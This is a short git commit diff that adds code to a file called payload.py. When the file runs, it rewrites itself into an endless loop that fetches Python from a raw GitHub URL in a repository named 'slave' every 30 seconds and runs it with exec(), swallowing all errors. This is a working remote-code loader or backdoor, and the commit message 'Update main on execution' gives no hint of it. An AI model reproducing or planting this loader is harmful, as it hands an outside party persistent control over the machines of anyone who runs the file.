757c856cdba24e45d022251469fb8ef650b074bc
liverfried <113541287+liverfried@users.noreply.github.com>
2022-11-29 23:05:49 +0100

    Update main on execution

--- payload.py
+++ payload.py
@@ -1,1 +1,14 @@
+with open(__file__, 'w') as f:
+    f.write("""from urllib.request import urlopen
+from time import sleep
+
+while True:
+    try:
+        with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/payload.py') as payload:
+            exec(payload.read())
+    except Exception:
+        ...
+
+    sleep(30)""")
+
 exit()
